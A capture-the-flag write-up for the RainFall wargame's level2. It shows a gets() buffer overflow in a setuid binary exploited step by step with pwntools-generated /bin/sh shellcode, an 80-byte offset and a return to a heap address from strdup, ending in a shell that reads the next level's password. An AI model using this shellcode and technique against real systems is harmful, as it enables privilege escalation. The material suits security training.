```
level2@RainFall:~$ ll
total 17
dr-xr-x---+ 1 level2 level2   80 Mar  6  2016 ./
dr-x--x--x  1 root   root    340 Sep 23  2015 ../
-rw-r--r--  1 level2 level2  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level2 level2 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level3 users  5403 Mar  6  2016 level2*
-rw-r--r--+ 1 level2 level2   65 Sep 23  2015 .pass
-rw-r--r--  1 level2 level2  675 Apr  3  2012 .profile
```
Ok Here we go again, a beatiful binary.
```
level2@RainFall:~$ ltrace ./level2
__libc_start_main(0x804853f, 1, 0xbffff7f4, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)                                                                                                     = 0
gets(0xbffff6fc, 0, 0, 0xb7e5ec73, 0x80482b5
)                                                                          = 0xbffff6fc
puts(""
)                                                                                                               = 1
strdup("")                                                                                                             = 0x0804a008
+++ exited (status 8) +++
```
Ok so once we have executed it, we see that the gets function is called.
And if we Objdump -S -M intel ./level2 > /tmp/3
we see that the function system doesn't get called, nor the execve so what do we do ?
we have to put it in !
How to do that we have to code it !
And yes we can If you want to know how this works then go to the end of this README.
Ok but how to write this ?
we will use python because it will be faster.

```
❯ nvim main.py
❯ cat main.py
import pwn


shellcode = pwn.asm(pwn.shellcraft.sh())
print(shellcode)

```
ok nice let's try this in the ssh connection

```
level2@RainFall:~$ python -c 'print b"jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"' | ./level2
jhh///sh/bin�4$ri1�jY���
                        X̀
```
Why doesn't it works ? for two reasons, first we haven't filled the buffer, we will see the second later ;)
let's see our objdump to see how long is the buffer !
```
 80484d7:       83 ec 68                sub    $0x68,%esp
 80484e7:       8d 45 b4                lea    -0x4c(%ebp),%eax
```
We create a 104bytes buffer, we then see that the buffer starts at 0x4c so at 76
So let's add this to our code.
```
import pwn


shellcode = pwn.asm(pwn.shellcraft.sh())
s_len = len(shellcode)

payload = shellcode + b"A"* (80 - s_len)

print(payload, len(shellcode))
```
```
level2@RainFall:~$ python -c 'print "jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"' | ./level2
jhh///sh/bin�4$ri1�jY���
                        X̀AAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```
Ok so still not but why ?
Let's use cutter to see the C code 
```
    if ((unaff_retaddr & 0xb0000000) == 0xb0000000) {
        printf("(%p)\n", unaff_retaddr);
        _exit(1);
    }
```

What does this mean ?
It means that if we return a stack value, we will exit.
So fortunatly for us there is a strdup in the code, so let's use this one.
We use strdup to get where is the adress of the strdup.
```
0x0804a008
```
we hav to put it in little endian and in a format for python to understand:
```
/x08/xa0/x04/x08
```
new Script :
```
import pwn


shellcode = pwn.asm(pwn.shellcraft.sh())
s_len = len(shellcode)

# adress 0x0804a008 
adress = b"\x08\xa0\x04\x08"


payload = shellcode + b'A'* (80 - s_len) + adress

print(payload)
```

```
jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x08\xa0\x04\x08
```
Now to finish, let's put the final prompt
```
level2@RainFall:~$ python -c 'print "jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x08\xa0\x04\x08"'| ./level2
jhh///sh/bin�4$ri1�jY���
                        X̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```
AH it doesn't work ?
yeas it does, we just have to let the sh connection opened
```
level2@RainFall:~$ (python -c 'print "jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x08\xa0\x04\x08"'; cat)| ./level2
jhh///sh/bin�4$ri1�jY���
                        X̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
ls
ls: cannot open directory .: Permission denied
cd ../level3
cat .pass
<hidden>
```
Good job !!
